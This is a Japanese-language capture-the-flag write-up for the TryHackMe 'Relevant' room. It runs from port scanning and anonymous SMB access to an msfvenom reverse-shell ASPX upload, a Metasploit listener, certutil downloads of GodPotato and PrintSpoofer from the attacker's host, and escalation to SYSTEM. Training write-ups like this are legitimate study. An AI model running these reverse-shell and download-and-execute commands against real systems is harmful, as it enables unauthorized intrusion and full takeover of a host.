# Relevant CTF

https://tryhackme.com/room/relevant

## Enumeration

```shell
TARGET=10.201.121.150
sudo bash -c "echo $TARGET   relevant.thm >> /etc/hosts"
```

### ポートスキャン

```sh
root@ip-10-201-31-145:~# nmap -sT -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-09-25 06:05 BST
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for relevant.thm (10.201.121.150)
Host is up (0.00056s latency).
Not shown: 65526 filtered ports
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
49663/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
MAC Address: 16:FF:D1:E3:A3:A9 (Unknown)
```

```shell
root@ip-10-201-31-145:~# nmap -sV -p80,135,139,445,3389,5985,49663,49666,49667 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-09-25 06:08 BST
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for relevant.thm (10.201.121.150)
Host is up (0.00035s latency).

PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49663/tcp open  http          Microsoft IIS httpd 10.0
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 16:FF:D1:E3:A3:A9 (Unknown)
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
```

HTTP(80,49663)、SMB,RDPが開いている。

### ディレクトリ列挙

#### 80ポート

何も出ない

```sh
dirb http://$TARGET
```

```shell
cat /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt | sort -u > ./dirlist.txt

gobuster dir -q -x=txt,html -u http://$TARGET -w ./dirlist.txt -t 64 -k
```

#### 49663ポート

```sh
root@ip-10-201-31-145:~# dirb http://$TARGET:49663/

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Thu Sep 25 06:10:31 2025
URL_BASE: http://10.201.121.150:49663/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.201.121.150:49663/ ----
==> DIRECTORY: http://10.201.121.150:49663/aspnet_client/                                                 

---- Entering directory: http://10.201.121.150:49663/aspnet_client/ ----
==> DIRECTORY: http://10.201.121.150:49663/aspnet_client/system_web/                                                    
---- Entering directory: http://10.201.121.150:49663/aspnet_client/system_web/ ----
```

```sh
root@ip-10-201-31-145:~# gobuster dir -q -x=txt,html -u http://$TARGET:49663 -w ./dirlist.txt -t 64 -k

...
/aspnet_client        (Status: 301) [Size: 165] [--> http://10.201.121.150:49663/aspnet_client/]
...
/nt4wrksv             (Status: 301) [Size: 160]
...
```

## SMB

共有フォルダを発見。49663ポートで発見したディレクトリ名と同じ。

```sh
$ smbclient -L \\$TARGET -U ""
Password for [WORKGROUP\]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        nt4wrksv        Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.201.121.150 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

passwords.txt をダウンロード

```sh
$ smbclient //$TARGET/nt4wrksv -U ""
Password for [WORKGROUP\]:
Try "help" to get a list of possible commands.

smb: \> l
  .                                   D        0  Sun Jul 26 06:46:04 2020
  ..                                  D        0  Sun Jul 26 06:46:04 2020
  passwords.txt                       A       98  Sun Jul 26 00:15:33 2020

                7735807 blocks of size 4096. 4947435 blocks available
smb: \> get passwords.txt
getting file \passwords.txt of size 98 as passwords.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
```

デコードしたら、2ユーザーのパスワードになったが、RDP接続はできなかった。

```
Bob - [REDACTED]
Bill - [REDACTED]
```

ユーザー列挙したらBobは出てきた。

```sh
$ python3 /usr/share/doc/python3-impacket/examples/lookupsid.py anonymous@$TARGET
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Brute forcing SIDs at 10.201.121.150
[*] StringBinding ncacn_np:10.201.121.150[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-3981879597-1135670737-2718083060
500: RELEVANT\Administrator (SidTypeUser)
501: RELEVANT\Guest (SidTypeUser)
503: RELEVANT\DefaultAccount (SidTypeUser)
513: RELEVANT\None (SidTypeGroup)
1002: RELEVANT\Bob (SidTypeUser)
```

nt4wrksvディレクトリがWebから参照できる可能性があるので、アップロードを試みる。

```sh
smb: \> put pentest.php
putting file pentest.php as \pentest.php (2.5 kb/s) (average 2.5 kb/s)

smb: \> ls
  .                                   D        0  Thu Sep 25 14:24:06 2025
  ..                                  D        0  Thu Sep 25 14:24:06 2025
  passwords.txt                       A       98  Sun Jul 26 00:15:33 2020
  pentest.php                         A     2591  Thu Sep 25 14:24:07 2025

                7735807 blocks of size 4096. 4950542 blocks available
```

アップロードはできたが、実行できなかった。PHPが稼働していないと思われるのでASPを試す。

```sh
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.146.32 LPORT=8888 -f aspxmsfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.146.32 LPORT=8888 -f aspx > shell.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of aspx file: 3434 bytes
```

aspxをアップロード

```sh
smb: \> put shell.aspx
putting file shell.aspx as \shell.aspx (3.3 kb/s) (average 2.9 kb/s)

smb: \> ls
  .                                   D        0  Thu Sep 25 14:32:03 2025
  ..                                  D        0  Thu Sep 25 14:32:03 2025
  passwords.txt                       A       98  Sun Jul 26 00:15:33 2020
  pentest.php                         A     2591  Thu Sep 25 14:24:07 2025
  shell.aspx                          A     3434  Thu Sep 25 14:32:04 2025
```

リッスン

```sh
$ msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/shell_reverse_tcp; set LHOST 10.11.146.32; set LPORT 8888;exploit"
[*] Using configured payload generic/shell_reverse_tcp
payload => windows/x64/shell_reverse_tcp
LHOST => 10.11.146.32
LPORT => 8888
[*] Started reverse TCP handler on 10.11.146.32:8888 
[*] Command shell session 1 opened (10.11.146.32:8888 -> 10.201.116.113:49779) at 2025-09-25 14:33:04 +0900


Shell Banner:
Microsoft Windows [Version 10.0.14393]
-----
          

c:\windows\system32\inetsrv>whoami
whoami
iis apppool\defaultapppool
```

Bobのデスクトップでユーザーフラグを発見。

## 権限昇格

SeImpersonatePrivilege 権限が付いているので、権限昇格に使えると思われる。

```sh
c:\Users\Bob\Desktop>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

### GodPotato

GodPotatoをダウンロード

```sh
c:\Users\Public\Downloads>certutil -URLcache -split -f http://10.11.146.32:8000/GodPotato-NET4.exe c:\Users\Public\Downloads\potato.exe
certutil -URLcache -split -f http://10.11.146.32:8000/GodPotato-NET4.exe c:\Users\Public\Downloads\potato.exe
****  Online  ****
  0000  ...
  e000
CertUtil: -URLCache command completed successfully.

c:\Users\Public\Downloads>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is AC3C-5CB5

 Directory of c:\Users\Public\Downloads

09/24/2025  10:38 PM    <DIR>          .
09/24/2025  10:38 PM    <DIR>          ..
09/24/2025  10:38 PM            57,344 potato.exe
               1 File(s)         57,344 bytes
               2 Dir(s)  21,030,916,096 bytes free
```

実行したが失敗。理由は不明。

```sh
c:\Users\Public\Downloads>.\potato.exe -cmd "cmd /c whoami"
.\potato.exe -cmd "cmd /c whoami"
[*] CombaseModule: 0x140705078509568
[*] DispatchTable: 0x140705080486368
[*] UseProtseqFunction: 0x140705080016688
[*] UseProtseqFunctionParamCount: 5
[*] HookRPC
[*] Start PipeServer
[*] Trigger RPCSS
[*] CreateNamedPipe \\.\pipe\edc7b203-c8f8-4c68-b0ac-d260a9302fa6\pipe\epmapper
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 0000a002-0f28-ffff-0cc8-5206070d436d
[*] DCOM obj OXID: 0xff2478e46be45e71
[*] DCOM obj OID: 0x204917bd1336e8b6
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] UnmarshalObject: 0x80070005
[!] Failed to impersonate security context token
```

### PrintSpoofer

https://github.com/itm4n/PrintSpoofer

```sh
c:\Users\Public\Downloads>certutil -URLcache -split -f http://10.11.146.32:8000/PrintSpoofer64.exe c:\Users\Public\Downloads\PrintSpoofer.exe
certutil -URLcache -split -f http://10.11.146.32:8000/PrintSpoofer64.exe c:\Users\Public\Downloads\PrintSpoofer.exe
****  Online  ****
  0000  ...
  6a00
CertUtil: -URLCache command completed successfully.
```

成功

```sh
c:\Users\Public\Downloads>PrintSpoofer.exe -i -c cmd
PrintSpoofer.exe -i -c cmd
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

Administratorのデスクトップでルートフラグを発見。

## 振り返り

- 最初、ポートスキャンが終わらず途中で打ち切ってしまったため、49663ポートの存在を知らないまま先に進んで途方に暮れた。打ち切り厳禁。
- aspxのリバースシェルを使ったのは初めて。
- SeImpersonatePrivilege 権限が付いていて GodPotato が失敗したのも初めて。他のツールだとうまくいく場合があるということは覚えておく。
